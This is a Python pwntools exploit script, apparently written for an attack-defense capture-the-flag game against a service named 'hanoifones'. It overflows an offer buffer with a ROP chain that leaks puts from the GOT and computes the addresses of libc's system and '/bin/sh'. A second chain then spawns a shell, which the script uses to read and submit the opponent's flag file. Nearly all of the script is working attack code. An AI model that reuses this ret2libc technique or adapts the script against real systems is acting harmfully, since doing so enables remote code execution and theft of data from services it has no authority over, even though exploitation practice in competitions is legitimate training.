from pwn import *
import sys
from collections import OrderedDict
from urllib import urlencode
import requests
import time

#LIBCPATH='/lib/x86_64-linux-gnu/libc.so.6'
LIBCPATH='../libs/libc.so.6'

'''
HOST = '127.0.0.1'
PORT = 5000
'''

sys.path.append('../utilities/')
from utils import sendFlag
from utils import getFlagID

e = elf.ELF(LIBCPATH)
offset = e.symbols['system'] - e.symbols['puts']
binsh_offset = next(e.search("/bin/sh")) - e.symbols['puts']

gadget = 0x401663  # pop rdi; ret;
puts_got = 0x602020
puts_plt = 0x400890
main = 0x401506

'''
def getFlagID(ip, port):	
	params = OrderedDict([('enemy_name', 'CuredPin'), ('service', 'hanoifones')]) 
	res=requests.get("http://"+ip+":"+str(port)+"/flagid", params=urlencode(params))
	log.info(res.text)
	#time.sleep(10)
	return res.text

def submitFlags(flag):
    log.info("Sending flag")
    #print(flag1)
    #txtFile.write(flag)
    #txtFile.write("\n")
    res=requests.post("http://" + HOST + ":" + str(PORT) + "/submit", data={'flag': flag, 'team':'LiquidPad', 'service':'hanoifones'})
    
    return res.text
'''
	
def offer_value(conn, x):
    print conn.recvuntil("offer?")
    conn.sendline("{0}".format(x))


def exploit(ip, port, flag_id):
    conn = remote(ip, port)

    print conn.recvuntil("?: ")
    conn.sendline("3")
    print conn.recvuntil("ID: ")
    conn.sendline(flag_id)
    print conn.recvuntil("?: ")

    conn.sendline("1")
    conn.sendline("62996904")
    print conn.recvuntil("?: ")
    conn.sendline("1")

    for i in range(127):
        offer_value(conn, 2)
    #print "sono qui"
    #time.sleep(10)

    offer_value(conn, gadget)
    offer_value(conn, puts_got)
    offer_value(conn, puts_plt)
    offer_value(conn, main - 2)
    offer_value(conn, main - 1)

    msg = conn.recvuntil("?: ")

    print msg
    #time.sleep(20)

    msg = msg[msg.find("\nHi!") - 6: msg.find("\nHi!")]
    puts_in_libc = "\x00\x00"+msg[5]+msg[4]+msg[3]+msg[2]+msg[1]+msg[0]
    puts_in_libc_int = int(enhex(puts_in_libc), 16)

    system_in_libc = puts_in_libc_int + offset
    binsh_in_libc = puts_in_libc_int + binsh_offset

    conn.sendline("3")
    print conn.recvuntil("ID: ")
    conn.sendline(flag_id)
    print conn.recvuntil("?: ")

    conn.sendline("1")
    conn.sendline("55555555555555555")
    print conn.recvuntil("?: ")
    conn.sendline("1")

    for i in range(127):
        offer_value(conn, 2)

    offer_value(conn, gadget)
    offer_value(conn, binsh_in_libc)
    offer_value(conn, system_in_libc)
    offer_value(conn, 10)
    offer_value(conn, 15)

    print conn.recvuntil('$.\n')  # read last messages
    print conn.recvuntil('$.\n')
    #time.sleep(20)
    #conn.sendline("sh")
    #conn.interactive()
    str = "cat "+flag_id
    #str = "/bin/bash"
    
    print str
    #s=conn.sendline("cat {0}".format(flag_id))
    conn.sendline(str)
    
    f=conn.recvuntil('\n')  # first line in the file is the password
    print f
    flag = conn.recvuntil('\n').strip()  # second line is the flag

    return flag
    

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: %s <ip>" % os.path.basename(__file__))
        sys.exit(1)
    else:
        print sendFlag(exploit(sys.argv[1], 20040, getFlagID("hanoifones")), "hanoifones")
        
    '''
    while(True):
	    flag_id = getFlagID(HOST, PORT)
	    flag = exploit(sys.argv[1], sys.argv[2], flag_id)
	    log.info(flag)
	    time.sleep(10)
    '''
